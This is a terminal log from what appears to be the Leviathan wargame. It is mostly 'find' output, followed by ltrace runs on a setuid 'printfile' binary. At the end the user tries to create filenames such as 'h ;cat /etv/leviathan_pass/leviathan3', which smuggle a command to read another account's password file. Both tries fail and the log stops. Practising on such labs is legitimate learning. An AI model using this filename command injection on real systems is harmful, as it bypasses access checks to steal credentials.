/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12003.slice/user@12003.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12003.slice/user@12003.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12003.slice/user@12003.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12003.slice/user@12003.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12003.slice/user@12003.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12003.slice/user@12003.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12003.slice/user@12003.service/init.scope/notify_on_release
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/polkit-1': Permission denied
find: '/var/spool/rsyslog': Permission denied
find: '/var/spool/cron/atspool': Permission denied
find: '/var/spool/cron/atjobs': Permission denied
find: '/var/spool/cron/crontabs': Permission denied
find: '/var/crash': Permission denied
find: '/var/tmp': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/tmp': Permission denied
find: '/sys/fs/fuse/connections/39': Permission denied
/sys/fs/cgroup/systemd/user.slice/user-12003.slice/user@12003.service
/sys/fs/cgroup/systemd/user.slice/user-12003.slice/user@12003.service/tasks
/sys/fs/cgroup/systemd/user.slice/user-12003.slice/user@12003.service/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-12003.slice/user@12003.service/init.scope
/sys/fs/cgroup/systemd/user.slice/user-12003.slice/user@12003.service/init.scope/tasks
/sys/fs/cgroup/systemd/user.slice/user-12003.slice/user@12003.service/init.scope/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-12003.slice/user@12003.service/init.scope/cgroup.clone_children
/sys/fs/cgroup/systemd/user.slice/user-12003.slice/user@12003.service/init.scope/notify_on_release
find: '/sys/kernel/debug': Permission denied
find: '/proc/tty/driver': Permission denied
find: '/proc/2844/task/2844/fd/6': No such file or directory
find: '/proc/2844/task/2844/fdinfo/6': No such file or directory
find: '/proc/2844/fd/5': No such file or directory
find: '/proc/2844/fdinfo/5': No such file or directory
leviathan2@leviathan:~$ find /  -user leviathan2
find: '/etc/ssl/private': Permission denied
/etc/leviathan_pass/leviathan2
find: '/etc/polkit-1/localauthority': Permission denied
find: '/run/lxcfs': Permission denied
/run/user/12002
/run/user/12002/systemd
/run/user/12002/systemd/private
/run/user/12002/systemd/notify
find: '/run/user/12003': Permission denied
find: '/run/user/12001': Permission denied
find: '/run/user/12000': Permission denied
find: '/run/user/12006': Permission denied
find: '/run/sudo': Permission denied
find: '/run/log/journal/0d8e66480c320675a338622759f86ace': Permission denied
find: '/run/lvm': Permission denied
find: '/run/systemd/inaccessible': Permission denied
/run/lock/hihi 1
/run/lock/hihi
/run/lock/hi
find: '/run/lock/lvm': Permission denied
find: '/dev/mqueue': Permission denied
find: '/dev/shm': Permission denied
/dev/pts/5
find: '/lost+found': Permission denied
find: '/root': Permission denied
/home/leviathan1/check
find: '/home/leviathan0/.backup': Permission denied
find: '/home/leviathan4/.trash': Permission denied
find: '/var/log': Permission denied
find: '/var/lib/puppet': Permission denied
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12002.slice/user@12002.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12002.slice/user@12002.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12002.slice/user@12002.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12002.slice/user@12002.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12002.slice/user@12002.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12002.slice/user@12002.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12002.slice/user@12002.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12002.slice/user@12002.service/init.scope/notify_on_release
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/polkit-1': Permission denied
find: '/var/spool/rsyslog': Permission denied
find: '/var/spool/cron/atspool': Permission denied
find: '/var/spool/cron/atjobs': Permission denied
find: '/var/spool/cron/crontabs': Permission denied
find: '/var/crash': Permission denied
find: '/var/tmp': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/tmp': Permission denied
find: '/sys/fs/fuse/connections/39': Permission denied
/sys/fs/cgroup/systemd/user.slice/user-12002.slice/user@12002.service
/sys/fs/cgroup/systemd/user.slice/user-12002.slice/user@12002.service/tasks
/sys/fs/cgroup/systemd/user.slice/user-12002.slice/user@12002.service/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-12002.slice/user@12002.service/init.scope
/sys/fs/cgroup/systemd/user.slice/user-12002.slice/user@12002.service/init.scope/tasks
/sys/fs/cgroup/systemd/user.slice/user-12002.slice/user@12002.service/init.scope/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-12002.slice/user@12002.service/init.scope/cgroup.clone_children
/sys/fs/cgroup/systemd/user.slice/user-12002.slice/user@12002.service/init.scope/notify_on_release
find: '/sys/kernel/debug': Permission denied
find: '/proc/tty/driver': Permission denied
/proc/1831
/proc/1831/task
/proc/1831/task/1831
/proc/1831/task/1831/fd
/proc/1831/task/1831/fd/0
/proc/1831/task/1831/fd/1
/proc/1831/task/1831/fd/2
/proc/1831/task/1831/fd/3
/proc/1831/task/1831/fd/4
/proc/1831/task/1831/fd/5
/proc/1831/task/1831/fd/6
/proc/1831/task/1831/fd/7
/proc/1831/task/1831/fd/8
/proc/1831/task/1831/fd/9
/proc/1831/task/1831/fd/10
/proc/1831/task/1831/fd/11
/proc/1831/task/1831/fd/12
/proc/1831/task/1831/fd/13
/proc/1831/task/1831/fd/14
/proc/1831/task/1831/fdinfo
/proc/1831/task/1831/fdinfo/0
/proc/1831/task/1831/fdinfo/1
/proc/1831/task/1831/fdinfo/2
/proc/1831/task/1831/fdinfo/3
/proc/1831/task/1831/fdinfo/4
/proc/1831/task/1831/fdinfo/5
/proc/1831/task/1831/fdinfo/6
/proc/1831/task/1831/fdinfo/7
/proc/1831/task/1831/fdinfo/8
/proc/1831/task/1831/fdinfo/9
/proc/1831/task/1831/fdinfo/10
/proc/1831/task/1831/fdinfo/11
/proc/1831/task/1831/fdinfo/12
/proc/1831/task/1831/fdinfo/13
/proc/1831/task/1831/fdinfo/14
/proc/1831/task/1831/ns
/proc/1831/task/1831/ns/net
/proc/1831/task/1831/ns/uts
/proc/1831/task/1831/ns/ipc
/proc/1831/task/1831/ns/pid
/proc/1831/task/1831/ns/user
/proc/1831/task/1831/ns/mnt
/proc/1831/task/1831/ns/cgroup
/proc/1831/task/1831/net
/proc/1831/task/1831/environ
/proc/1831/task/1831/auxv
/proc/1831/task/1831/status
/proc/1831/task/1831/personality
/proc/1831/task/1831/limits
/proc/1831/task/1831/sched
/proc/1831/task/1831/comm
/proc/1831/task/1831/syscall
/proc/1831/task/1831/cmdline
/proc/1831/task/1831/stat
/proc/1831/task/1831/statm
/proc/1831/task/1831/maps
/proc/1831/task/1831/children
/proc/1831/task/1831/numa_maps
/proc/1831/task/1831/mem
/proc/1831/task/1831/cwd
/proc/1831/task/1831/root
/proc/1831/task/1831/exe
/proc/1831/task/1831/mounts
/proc/1831/task/1831/mountinfo
/proc/1831/task/1831/clear_refs
/proc/1831/task/1831/smaps
/proc/1831/task/1831/pagemap
/proc/1831/task/1831/attr
/proc/1831/task/1831/attr/current
/proc/1831/task/1831/attr/prev
/proc/1831/task/1831/attr/exec
/proc/1831/task/1831/attr/fscreate
/proc/1831/task/1831/attr/keycreate
/proc/1831/task/1831/attr/sockcreate
/proc/1831/task/1831/wchan
/proc/1831/task/1831/stack
/proc/1831/task/1831/schedstat
/proc/1831/task/1831/cpuset
/proc/1831/task/1831/cgroup
/proc/1831/task/1831/oom_score
/proc/1831/task/1831/oom_adj
/proc/1831/task/1831/oom_score_adj
/proc/1831/task/1831/loginuid
/proc/1831/task/1831/sessionid
/proc/1831/task/1831/io
/proc/1831/task/1831/uid_map
/proc/1831/task/1831/gid_map
/proc/1831/task/1831/projid_map
/proc/1831/task/1831/setgroups
/proc/1831/fd
/proc/1831/fd/0
/proc/1831/fd/1
/proc/1831/fd/2
/proc/1831/fd/3
/proc/1831/fd/4
/proc/1831/fd/5
/proc/1831/fd/6
/proc/1831/fd/7
/proc/1831/fd/8
/proc/1831/fd/9
/proc/1831/fd/10
/proc/1831/fd/11
/proc/1831/fd/12
/proc/1831/fd/13
/proc/1831/fd/14
/proc/1831/map_files
/proc/1831/map_files/555555554000-5555556b0000
/proc/1831/map_files/5555556b1000-5555556d5000
/proc/1831/map_files/5555556d5000-5555556d6000
/proc/1831/map_files/7ffff53e5000-7ffff53f0000
/proc/1831/map_files/7ffff53f0000-7ffff55ef000
/proc/1831/map_files/7ffff55ef000-7ffff55f0000
/proc/1831/map_files/7ffff55f0000-7ffff55f1000
/proc/1831/map_files/7ffff55f7000-7ffff5602000
/proc/1831/map_files/7ffff5602000-7ffff5801000
/proc/1831/map_files/7ffff5801000-7ffff5802000
/proc/1831/map_files/7ffff5802000-7ffff5803000
/proc/1831/map_files/7ffff5803000-7ffff5819000
/proc/1831/map_files/7ffff5819000-7ffff5a18000
/proc/1831/map_files/7ffff5a18000-7ffff5a19000
/proc/1831/map_files/7ffff5a19000-7ffff5a1a000
/proc/1831/map_files/7ffff5a1c000-7ffff5a24000
/proc/1831/map_files/7ffff5a24000-7ffff5c23000
/proc/1831/map_files/7ffff5c23000-7ffff5c24000
/proc/1831/map_files/7ffff5c24000-7ffff5c25000
/proc/1831/map_files/7ffff5c25000-7ffff5c29000
/proc/1831/map_files/7ffff5c29000-7ffff5e28000
/proc/1831/map_files/7ffff5e28000-7ffff5e29000
/proc/1831/map_files/7ffff5e29000-7ffff5e2a000
/proc/1831/map_files/7ffff5e2a000-7ffff5e66000
/proc/1831/map_files/7ffff5e66000-7ffff6065000
/proc/1831/map_files/7ffff6065000-7ffff6069000
/proc/1831/map_files/7ffff6069000-7ffff606a000
/proc/1831/map_files/7ffff606b000-7ffff606e000
/proc/1831/map_files/7ffff606e000-7ffff626d000
/proc/1831/map_files/7ffff626d000-7ffff626e000
/proc/1831/map_files/7ffff626e000-7ffff626f000
/proc/1831/map_files/7ffff626f000-7ffff62dd000
/proc/1831/map_files/7ffff62dd000-7ffff64dd000
/proc/1831/map_files/7ffff64dd000-7ffff64de000
/proc/1831/map_files/7ffff64de000-7ffff64df000
/proc/1831/map_files/7ffff64df000-7ffff669f000
/proc/1831/map_files/7ffff669f000-7ffff689f000
/proc/1831/map_files/7ffff689f000-7ffff68a3000
/proc/1831/map_files/7ffff68a3000-7ffff68a5000
/proc/1831/map_files/7ffff68a9000-7ffff68c1000
/proc/1831/map_files/7ffff68c1000-7ffff6ac0000
/proc/1831/map_files/7ffff6ac0000-7ffff6ac1000
/proc/1831/map_files/7ffff6ac1000-7ffff6ac2000
/proc/1831/map_files/7ffff6ac6000-7ffff6b0a000
/proc/1831/map_files/7ffff6b0a000-7ffff6d0a000
/proc/1831/map_files/7ffff6d0a000-7ffff6d0b000
/proc/1831/map_files/7ffff6d0b000-7ffff6d0c000
/proc/1831/map_files/7ffff6d0d000-7ffff6d1c000
/proc/1831/map_files/7ffff6d1c000-7ffff6f1b000
/proc/1831/map_files/7ffff6f1b000-7ffff6f1c000
/proc/1831/map_files/7ffff6f1c000-7ffff6f1d000
/proc/1831/map_files/7ffff6f1d000-7ffff6f33000
/proc/1831/map_files/7ffff6f33000-7ffff7132000
/proc/1831/map_files/7ffff7132000-7ffff7133000
/proc/1831/map_files/7ffff7133000-7ffff7134000
/proc/1831/map_files/7ffff7134000-7ffff7150000
/proc/1831/map_files/7ffff7150000-7ffff734f000
/proc/1831/map_files/7ffff734f000-7ffff7350000
/proc/1831/map_files/7ffff7350000-7ffff7351000
/proc/1831/map_files/7ffff735b000-7ffff7368000
/proc/1831/map_files/7ffff7368000-7ffff7567000
/proc/1831/map_files/7ffff7567000-7ffff7568000
/proc/1831/map_files/7ffff7568000-7ffff7569000
/proc/1831/map_files/7ffff7569000-7ffff7592000
/proc/1831/map_files/7ffff7592000-7ffff7792000
/proc/1831/map_files/7ffff7792000-7ffff77a6000
/proc/1831/map_files/7ffff77a6000-7ffff77a7000
/proc/1831/map_files/7ffff77a7000-7ffff77ae000
/proc/1831/map_files/7ffff77ae000-7ffff79ad000
/proc/1831/map_files/7ffff79ad000-7ffff79ae000
/proc/1831/map_files/7ffff79ae000-7ffff79af000
/proc/1831/map_files/7ffff79af000-7ffff79b3000
/proc/1831/map_files/7ffff79b3000-7ffff7bb3000
/proc/1831/map_files/7ffff7bb3000-7ffff7bb4000
/proc/1831/map_files/7ffff7bb4000-7ffff7bb5000
/proc/1831/map_files/7ffff7bb5000-7ffff7bd4000
/proc/1831/map_files/7ffff7bd4000-7ffff7dd3000
/proc/1831/map_files/7ffff7dd3000-7ffff7dd4000
/proc/1831/map_files/7ffff7dd4000-7ffff7dd5000
/proc/1831/map_files/7ffff7dd7000-7ffff7dfd000
/proc/1831/map_files/7ffff7ffc000-7ffff7ffd000
/proc/1831/map_files/7ffff7ffd000-7ffff7ffe000
/proc/1831/fdinfo
/proc/1831/fdinfo/0
/proc/1831/fdinfo/1
/proc/1831/fdinfo/2
/proc/1831/fdinfo/3
/proc/1831/fdinfo/4
/proc/1831/fdinfo/5
/proc/1831/fdinfo/6
/proc/1831/fdinfo/7
/proc/1831/fdinfo/8
/proc/1831/fdinfo/9
/proc/1831/fdinfo/10
/proc/1831/fdinfo/11
/proc/1831/fdinfo/12
/proc/1831/fdinfo/13
/proc/1831/fdinfo/14
/proc/1831/ns
/proc/1831/ns/net
/proc/1831/ns/uts
/proc/1831/ns/ipc
/proc/1831/ns/pid
/proc/1831/ns/user
/proc/1831/ns/mnt
/proc/1831/ns/cgroup
/proc/1831/net
/proc/1831/environ
/proc/1831/auxv
/proc/1831/status
/proc/1831/personality
/proc/1831/limits
/proc/1831/sched
/proc/1831/autogroup
/proc/1831/comm
/proc/1831/syscall
/proc/1831/cmdline
/proc/1831/stat
/proc/1831/statm
/proc/1831/maps
/proc/1831/numa_maps
/proc/1831/mem
/proc/1831/cwd
/proc/1831/root
/proc/1831/exe
/proc/1831/mounts
/proc/1831/mountinfo
/proc/1831/mountstats
/proc/1831/clear_refs
/proc/1831/smaps
/proc/1831/pagemap
/proc/1831/attr
/proc/1831/attr/current
/proc/1831/attr/prev
/proc/1831/attr/exec
/proc/1831/attr/fscreate
/proc/1831/attr/keycreate
/proc/1831/attr/sockcreate
/proc/1831/wchan
/proc/1831/stack
/proc/1831/schedstat
/proc/1831/cpuset
/proc/1831/cgroup
/proc/1831/oom_score
/proc/1831/oom_adj
/proc/1831/oom_score_adj
/proc/1831/loginuid
/proc/1831/sessionid
/proc/1831/coredump_filter
/proc/1831/io
/proc/1831/uid_map
/proc/1831/gid_map
/proc/1831/projid_map
/proc/1831/setgroups
/proc/1831/timers
/proc/2457
/proc/2457/task
/proc/2457/task/2457
/proc/2457/task/2457/fd
/proc/2457/task/2457/fd/0
/proc/2457/task/2457/fd/1
/proc/2457/task/2457/fd/2
/proc/2457/task/2457/fd/255
/proc/2457/task/2457/fdinfo
/proc/2457/task/2457/fdinfo/0
/proc/2457/task/2457/fdinfo/1
/proc/2457/task/2457/fdinfo/2
/proc/2457/task/2457/fdinfo/255
/proc/2457/task/2457/ns
/proc/2457/task/2457/ns/net
/proc/2457/task/2457/ns/uts
/proc/2457/task/2457/ns/ipc
/proc/2457/task/2457/ns/pid
/proc/2457/task/2457/ns/user
/proc/2457/task/2457/ns/mnt
/proc/2457/task/2457/ns/cgroup
/proc/2457/task/2457/net
/proc/2457/task/2457/environ
/proc/2457/task/2457/auxv
/proc/2457/task/2457/status
/proc/2457/task/2457/personality
/proc/2457/task/2457/limits
/proc/2457/task/2457/sched
/proc/2457/task/2457/comm
/proc/2457/task/2457/syscall
/proc/2457/task/2457/cmdline
/proc/2457/task/2457/stat
/proc/2457/task/2457/statm
/proc/2457/task/2457/maps
/proc/2457/task/2457/children
/proc/2457/task/2457/numa_maps
/proc/2457/task/2457/mem
/proc/2457/task/2457/cwd
/proc/2457/task/2457/root
/proc/2457/task/2457/exe
/proc/2457/task/2457/mounts
/proc/2457/task/2457/mountinfo
/proc/2457/task/2457/clear_refs
/proc/2457/task/2457/smaps
/proc/2457/task/2457/pagemap
/proc/2457/task/2457/attr
/proc/2457/task/2457/attr/current
/proc/2457/task/2457/attr/prev
/proc/2457/task/2457/attr/exec
/proc/2457/task/2457/attr/fscreate
/proc/2457/task/2457/attr/keycreate
/proc/2457/task/2457/attr/sockcreate
/proc/2457/task/2457/wchan
/proc/2457/task/2457/stack
/proc/2457/task/2457/schedstat
/proc/2457/task/2457/cpuset
/proc/2457/task/2457/cgroup
/proc/2457/task/2457/oom_score
/proc/2457/task/2457/oom_adj
/proc/2457/task/2457/oom_score_adj
/proc/2457/task/2457/loginuid
/proc/2457/task/2457/sessionid
/proc/2457/task/2457/io
/proc/2457/task/2457/uid_map
/proc/2457/task/2457/gid_map
/proc/2457/task/2457/projid_map
/proc/2457/task/2457/setgroups
/proc/2457/fd
/proc/2457/fd/0
/proc/2457/fd/1
/proc/2457/fd/2
/proc/2457/fd/255
/proc/2457/map_files
/proc/2457/map_files/400000-4f4000
/proc/2457/map_files/6f3000-6f4000
/proc/2457/map_files/6f4000-6fd000
/proc/2457/map_files/7ffff6ac8000-7ffff6ad3000
/proc/2457/map_files/7ffff6ad3000-7ffff6cd2000
/proc/2457/map_files/7ffff6cd2000-7ffff6cd3000
/proc/2457/map_files/7ffff6cd3000-7ffff6cd4000
/proc/2457/map_files/7ffff6cda000-7ffff6ce5000
/proc/2457/map_files/7ffff6ce5000-7ffff6ee4000
/proc/2457/map_files/7ffff6ee4000-7ffff6ee5000
/proc/2457/map_files/7ffff6ee5000-7ffff6ee6000
/proc/2457/map_files/7ffff6ee6000-7ffff6efc000
/proc/2457/map_files/7ffff6efc000-7ffff70fb000
/proc/2457/map_files/7ffff70fb000-7ffff70fc000
/proc/2457/map_files/7ffff70fc000-7ffff70fd000
/proc/2457/map_files/7ffff70ff000-7ffff7107000
/proc/2457/map_files/7ffff7107000-7ffff7306000
/proc/2457/map_files/7ffff7306000-7ffff7307000
/proc/2457/map_files/7ffff7307000-7ffff7308000
/proc/2457/map_files/7ffff7308000-7ffff75e0000
/proc/2457/map_files/7ffff75e0000-7ffff77a0000
/proc/2457/map_files/7ffff77a0000-7ffff79a0000
/proc/2457/map_files/7ffff79a0000-7ffff79a4000
/proc/2457/map_files/7ffff79a4000-7ffff79a6000
/proc/2457/map_files/7ffff79aa000-7ffff79ad000
/proc/2457/map_files/7ffff79ad000-7ffff7bac000
/proc/2457/map_files/7ffff7bac000-7ffff7bad000
/proc/2457/map_files/7ffff7bad000-7ffff7bae000
/proc/2457/map_files/7ffff7bae000-7ffff7bd3000
/proc/2457/map_files/7ffff7bd3000-7ffff7dd2000
/proc/2457/map_files/7ffff7dd2000-7ffff7dd6000
/proc/2457/map_files/7ffff7dd6000-7ffff7dd7000
/proc/2457/map_files/7ffff7dd7000-7ffff7dfd000
/proc/2457/map_files/7ffff7fef000-7ffff7ff6000
/proc/2457/map_files/7ffff7ffc000-7ffff7ffd000
/proc/2457/map_files/7ffff7ffd000-7ffff7ffe000
/proc/2457/fdinfo
/proc/2457/fdinfo/0
/proc/2457/fdinfo/1
/proc/2457/fdinfo/2
/proc/2457/fdinfo/255
/proc/2457/ns
/proc/2457/ns/net
/proc/2457/ns/uts
/proc/2457/ns/ipc
/proc/2457/ns/pid
/proc/2457/ns/user
/proc/2457/ns/mnt
/proc/2457/ns/cgroup
/proc/2457/net
/proc/2457/environ
/proc/2457/auxv
/proc/2457/status
/proc/2457/personality
/proc/2457/limits
/proc/2457/sched
/proc/2457/autogroup
/proc/2457/comm
/proc/2457/syscall
/proc/2457/cmdline
/proc/2457/stat
/proc/2457/statm
/proc/2457/maps
/proc/2457/numa_maps
/proc/2457/mem
/proc/2457/cwd
/proc/2457/root
/proc/2457/exe
/proc/2457/mounts
/proc/2457/mountinfo
/proc/2457/mountstats
/proc/2457/clear_refs
/proc/2457/smaps
/proc/2457/pagemap
/proc/2457/attr
/proc/2457/attr/current
/proc/2457/attr/prev
/proc/2457/attr/exec
/proc/2457/attr/fscreate
/proc/2457/attr/keycreate
/proc/2457/attr/sockcreate
/proc/2457/wchan
/proc/2457/stack
/proc/2457/schedstat
/proc/2457/cpuset
/proc/2457/cgroup
/proc/2457/oom_score
/proc/2457/oom_adj
/proc/2457/oom_score_adj
/proc/2457/loginuid
/proc/2457/sessionid
/proc/2457/coredump_filter
/proc/2457/io
/proc/2457/uid_map
/proc/2457/gid_map
/proc/2457/projid_map
/proc/2457/setgroups
/proc/2457/timers
/proc/2845
/proc/2845/task
/proc/2845/task/2845
/proc/2845/task/2845/fd
/proc/2845/task/2845/fd/0
/proc/2845/task/2845/fd/1
/proc/2845/task/2845/fd/2
/proc/2845/task/2845/fd/3
/proc/2845/task/2845/fd/4
/proc/2845/task/2845/fd/5
find: '/proc/2845/task/2845/fd/6': No such file or directory
/proc/2845/task/2845/fd/7
/proc/2845/task/2845/fd/8
/proc/2845/task/2845/fd/9
/proc/2845/task/2845/fd/10
/proc/2845/task/2845/fdinfo
/proc/2845/task/2845/fdinfo/0
/proc/2845/task/2845/fdinfo/1
/proc/2845/task/2845/fdinfo/2
/proc/2845/task/2845/fdinfo/3
/proc/2845/task/2845/fdinfo/4
/proc/2845/task/2845/fdinfo/5
find: '/proc/2845/task/2845/fdinfo/6': No such file or directory
/proc/2845/task/2845/fdinfo/7
/proc/2845/task/2845/fdinfo/8
/proc/2845/task/2845/fdinfo/9
/proc/2845/task/2845/fdinfo/10
/proc/2845/task/2845/ns
/proc/2845/task/2845/ns/net
/proc/2845/task/2845/ns/uts
/proc/2845/task/2845/ns/ipc
/proc/2845/task/2845/ns/pid
/proc/2845/task/2845/ns/user
/proc/2845/task/2845/ns/mnt
/proc/2845/task/2845/ns/cgroup
/proc/2845/task/2845/net
/proc/2845/task/2845/environ
/proc/2845/task/2845/auxv
/proc/2845/task/2845/status
/proc/2845/task/2845/personality
/proc/2845/task/2845/limits
/proc/2845/task/2845/sched
/proc/2845/task/2845/comm
/proc/2845/task/2845/syscall
/proc/2845/task/2845/cmdline
/proc/2845/task/2845/stat
/proc/2845/task/2845/statm
/proc/2845/task/2845/maps
/proc/2845/task/2845/children
/proc/2845/task/2845/numa_maps
/proc/2845/task/2845/mem
/proc/2845/task/2845/cwd
/proc/2845/task/2845/root
/proc/2845/task/2845/exe
/proc/2845/task/2845/mounts
/proc/2845/task/2845/mountinfo
/proc/2845/task/2845/clear_refs
/proc/2845/task/2845/smaps
/proc/2845/task/2845/pagemap
/proc/2845/task/2845/attr
/proc/2845/task/2845/attr/current
/proc/2845/task/2845/attr/prev
/proc/2845/task/2845/attr/exec
/proc/2845/task/2845/attr/fscreate
/proc/2845/task/2845/attr/keycreate
/proc/2845/task/2845/attr/sockcreate
/proc/2845/task/2845/wchan
/proc/2845/task/2845/stack
/proc/2845/task/2845/schedstat
/proc/2845/task/2845/cpuset
/proc/2845/task/2845/cgroup
/proc/2845/task/2845/oom_score
/proc/2845/task/2845/oom_adj
/proc/2845/task/2845/oom_score_adj
/proc/2845/task/2845/loginuid
/proc/2845/task/2845/sessionid
/proc/2845/task/2845/io
/proc/2845/task/2845/uid_map
/proc/2845/task/2845/gid_map
/proc/2845/task/2845/projid_map
/proc/2845/task/2845/setgroups
/proc/2845/fd
/proc/2845/fd/0
/proc/2845/fd/1
/proc/2845/fd/2
/proc/2845/fd/3
/proc/2845/fd/4
find: '/proc/2845/fd/5': No such file or directory
/proc/2845/fd/6
/proc/2845/fd/7
/proc/2845/map_files
/proc/2845/map_files/555555554000-555555587000
/proc/2845/map_files/555555787000-555555789000
/proc/2845/map_files/555555789000-55555578a000
/proc/2845/map_files/7ffff6611000-7ffff661c000
/proc/2845/map_files/7ffff661c000-7ffff681b000
/proc/2845/map_files/7ffff681b000-7ffff681c000
/proc/2845/map_files/7ffff681c000-7ffff681d000
/proc/2845/map_files/7ffff6823000-7ffff682e000
/proc/2845/map_files/7ffff682e000-7ffff6a2d000
/proc/2845/map_files/7ffff6a2d000-7ffff6a2e000
/proc/2845/map_files/7ffff6a2e000-7ffff6a2f000
/proc/2845/map_files/7ffff6a2f000-7ffff6a45000
/proc/2845/map_files/7ffff6a45000-7ffff6c44000
/proc/2845/map_files/7ffff6c44000-7ffff6c45000
/proc/2845/map_files/7ffff6c45000-7ffff6c46000
/proc/2845/map_files/7ffff6c48000-7ffff6c50000
/proc/2845/map_files/7ffff6c50000-7ffff6e4f000
/proc/2845/map_files/7ffff6e4f000-7ffff6e50000
/proc/2845/map_files/7ffff6e50000-7ffff6e51000
/proc/2845/map_files/7ffff6e51000-7ffff6e69000
/proc/2845/map_files/7ffff6e69000-7ffff7068000
/proc/2845/map_files/7ffff7068000-7ffff7069000
/proc/2845/map_files/7ffff7069000-7ffff706a000
/proc/2845/map_files/7ffff706e000-7ffff7071000
/proc/2845/map_files/7ffff7071000-7ffff7270000
/proc/2845/map_files/7ffff7270000-7ffff7271000
/proc/2845/map_files/7ffff7271000-7ffff7272000
/proc/2845/map_files/7ffff7272000-7ffff72e0000
/proc/2845/map_files/7ffff72e0000-7ffff74e0000
/proc/2845/map_files/7ffff74e0000-7ffff74e1000
/proc/2845/map_files/7ffff74e1000-7ffff74e2000
/proc/2845/map_files/7ffff74e2000-7ffff76a2000
/proc/2845/map_files/7ffff76a2000-7ffff78a2000
/proc/2845/map_files/7ffff78a2000-7ffff78a6000
/proc/2845/map_files/7ffff78a6000-7ffff78a8000
/proc/2845/map_files/7ffff78ac000-7ffff79b4000
/proc/2845/map_files/7ffff79b4000-7ffff7bb3000
/proc/2845/map_files/7ffff7bb3000-7ffff7bb4000
/proc/2845/map_files/7ffff7bb4000-7ffff7bb5000
/proc/2845/map_files/7ffff7bb5000-7ffff7bd4000
/proc/2845/map_files/7ffff7bd4000-7ffff7dd3000
/proc/2845/map_files/7ffff7dd3000-7ffff7dd4000
/proc/2845/map_files/7ffff7dd4000-7ffff7dd5000
/proc/2845/map_files/7ffff7dd7000-7ffff7dfd000
/proc/2845/map_files/7ffff7ffc000-7ffff7ffd000
/proc/2845/map_files/7ffff7ffd000-7ffff7ffe000
/proc/2845/fdinfo
/proc/2845/fdinfo/0
/proc/2845/fdinfo/1
/proc/2845/fdinfo/2
/proc/2845/fdinfo/3
/proc/2845/fdinfo/4
find: '/proc/2845/fdinfo/5': No such file or directory
/proc/2845/fdinfo/6
/proc/2845/fdinfo/7
/proc/2845/ns
/proc/2845/ns/net
/proc/2845/ns/uts
/proc/2845/ns/ipc
/proc/2845/ns/pid
/proc/2845/ns/user
/proc/2845/ns/mnt
/proc/2845/ns/cgroup
/proc/2845/net
/proc/2845/environ
/proc/2845/auxv
/proc/2845/status
/proc/2845/personality
/proc/2845/limits
/proc/2845/sched
/proc/2845/autogroup
/proc/2845/comm
/proc/2845/syscall
/proc/2845/cmdline
/proc/2845/stat
/proc/2845/statm
/proc/2845/maps
/proc/2845/numa_maps
/proc/2845/mem
/proc/2845/cwd
/proc/2845/root
/proc/2845/exe
/proc/2845/mounts
/proc/2845/mountinfo
/proc/2845/mountstats
/proc/2845/clear_refs
/proc/2845/smaps
/proc/2845/pagemap
/proc/2845/attr
/proc/2845/attr/current
/proc/2845/attr/prev
/proc/2845/attr/exec
/proc/2845/attr/fscreate
/proc/2845/attr/keycreate
/proc/2845/attr/sockcreate
/proc/2845/wchan
/proc/2845/stack
/proc/2845/schedstat
/proc/2845/cpuset
/proc/2845/cgroup
/proc/2845/oom_score
/proc/2845/oom_adj
/proc/2845/oom_score_adj
/proc/2845/loginuid
/proc/2845/sessionid
/proc/2845/coredump_filter
/proc/2845/io
/proc/2845/uid_map
/proc/2845/gid_map
/proc/2845/projid_map
/proc/2845/setgroups
/proc/2845/timers
leviathan2@leviathan:~$ ltrace ./printfile
__libc_start_main(0x804858d, 1, 0xffffd6e4, 0x8048680 <unfinished ...>
puts("*** File Printer ***"*** File Printer ***
)                                                             = 21
printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename
)                                            = 28
+++ exited (status 255) +++
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804858d, 2, 0xffffd6b4, 0x8048680 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                              = -1
puts("You cant have that file..."You cant have that file...
)                                                       = 27
+++ exited (status 1) +++
leviathan2@leviathan:~$ ltrace ./printfile /tmp/la/leviathan3
__libc_start_main(0x804858d, 2, 0xffffd6c4, 0x8048680 <unfinished ...>
access("/tmp/la/leviathan3", 4)                                                          = -1
puts("You cant have that file..."You cant have that file...
)                                                       = 27
+++ exited (status 1) +++
leviathan2@leviathan:~$ touch /tmp/la/hello
leviathan2@leviathan:~$ cd /tmp/la"
> ^C
leviathan2@leviathan:~$ cd /tmp/la
leviathan2@leviathan:/tmp/la$ touch "h ;cat /etv/leviathan_pass/leviathan3"
touch: cannot touch 'h ;cat /etv/leviathan_pass/leviathan3': No such file or directory
leviathan2@leviathan:/tmp/la$ touch "h\ ;cat /etv/leviathan_pass/leviathan3"
touch: cannot touch 'h\ ;cat /etv/leviathan_pass/leviathan3': No such file or directory
